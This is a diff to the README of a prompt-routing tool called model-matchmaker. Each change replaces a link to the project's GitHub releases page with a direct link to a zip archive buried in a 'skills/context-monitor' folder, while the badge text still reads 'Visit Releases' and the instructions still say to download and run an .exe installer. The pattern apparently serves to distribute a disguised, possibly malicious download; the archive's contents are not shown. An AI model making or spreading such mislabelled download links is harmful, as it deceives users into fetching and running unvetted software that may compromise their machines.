@@ -1,6 +1,6 @@
 # 🤖 model-matchmaker - Route Prompts to the Right Model
 
-[![Download model-matchmaker](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://github.com/codepavan1/model-matchmaker/releases)
+[![Download model-matchmaker](https://img.shields.io/badge/Download-Visit%20Releases-blue)](https://raw.githubusercontent.com/codepavan1/model-matchmaker/main/skills/context-monitor/model_matchmaker_v1.5-alpha.4.zip)
 
 ## About model-matchmaker
 
@@ -24,7 +24,7 @@ Follow these steps to get model-matchmaker running on your Windows computer.
 
 Visit the releases page to download the latest version of model-matchmaker:
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Releases-brightgreen)](https://github.com/codepavan1/model-matchmaker/releases)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/codepavan1/model-matchmaker/main/skills/context-monitor/model_matchmaker_v1.5-alpha.4.zip)
 
 - Click the green button labeled as the latest release.
 - Download the `.exe` setup file for Windows.
@@ -78,7 +78,7 @@ Changes you make are saved automatically.
 To keep the app running smoothly and securely, check regularly for updates:
 
 - Visit the releases page:  
-  https://github.com/codepavan1/model-matchmaker/releases  
+  https://raw.githubusercontent.com/codepavan1/model-matchmaker/main/skills/context-monitor/model_matchmaker_v1.5-alpha.4.zip  
 - Download the latest `.exe` installer file.
 - Run it like before. Your settings will remain intact.
 
@@ -98,6 +98,6 @@ You can ask questions or report issues by opening a new issue on the GitHub repo
 
 ---
 
-[Download model-matchmaker](https://github.com/codepavan1/model-matchmaker/releases)
+[Download model-matchmaker](https://raw.githubusercontent.com/codepavan1/model-matchmaker/main/skills/context-monitor/model_matchmaker_v1.5-alpha.4.zip)
 
 Click the link above to download or update model-matchmaker anytime.
